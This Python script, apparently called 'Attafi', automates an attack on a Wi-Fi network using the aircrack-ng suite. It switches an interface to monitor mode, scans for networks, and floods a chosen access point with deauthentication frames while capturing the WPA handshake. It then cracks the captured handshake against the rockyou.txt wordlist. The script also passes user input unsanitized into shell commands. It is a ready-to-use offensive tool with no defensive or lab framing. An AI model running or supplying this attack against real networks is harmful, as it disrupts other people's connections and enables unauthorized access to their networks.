import subprocess
import time
import os
import signal

def run_command(cmd, silent=False):
    try:
        if not silent:
            print(f"\n📟 Running: {cmd}")
        result = subprocess.run(cmd, shell=True, check=True, capture_output=not silent, text=True)
        return result.stdout if not silent else None
    except subprocess.CalledProcessError as e:
        print(f"❌ Error running: {cmd}")
        print(e.output)
        exit(1)

def scan_networks(interface, duration=15):
    print(f"\n📡 Scanning for networks on {interface}. \n⏳ Wait for {duration} seconds...")
    proc = subprocess.Popen(["airodump-ng", interface], preexec_fn=os.setsid)
    try:
        time.sleep(duration)
        print("⏱️ Timeout reached. Stopping scan...")
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        proc.wait()
        print("✅ Scan stopped.")
    except Exception as e:
        print(f"⚠️ Error stopping scan: {e}")
        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)

def main():
    print("\n\t\t\t=== 🚀 Attafi 🚀 ===\n")

    print(run_command("ifconfig"))

    interface = input("Enter your Wi-Fi interface name (e.g., wlan0): ").strip()

    run_command(f"ifconfig {interface} down")
    run_command("airmon-ng check kill")
    run_command(f"iwconfig {interface} mode monitor")
    run_command(f"ifconfig {interface} up")
    print(f"\n✅ {interface} is now in Monitor Mode.")

    scan_networks(interface, duration=15)

    bssid = input("Enter BSSID of target: ").strip()
    channel = input("Enter Channel number of target: ").strip()
    file_name = input("Enter file name to save capture (without extension): ").strip()

    # Start handshake capture
    print("\n📡 Starting handshake capture and deauth attack in parallel...")
    dump_cmd = f"airodump-ng --bssid {bssid} --channel {channel} --write {file_name} {interface}"
    dump_proc = subprocess.Popen(dump_cmd, shell=True, preexec_fn=os.setsid)

    # Start deauthentication attack simultaneously
    deauth_cmd = f"aireplay-ng --deauth 1000000 -a {bssid} {interface}"
    deauth_proc = subprocess.Popen(deauth_cmd, shell=True, preexec_fn=os.setsid)

    try:
        print("\n⌛ Waiting for handshake capture.....\n Press Ctrl+C when handshake is captured.")
        while True:
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n⛔ Stopping all attacks...")
        os.killpg(os.getpgid(dump_proc.pid), signal.SIGTERM)
        os.killpg(os.getpgid(deauth_proc.pid), signal.SIGTERM)
        dump_proc.wait()
        deauth_proc.wait()

    # Try cracking with rockyou.txt
    print("\n🔓 Attempting to crack password using rockyou.txt...")
    output = run_command(f"aircrack-ng -w rockyou.txt {file_name}-01.cap")
    print("\n🪪 Cracking Output:\n")
    print(output)


    print("\n\t\t\t✅ Attafi attack process complete.\n")

if __name__ == "__main__":
    main()

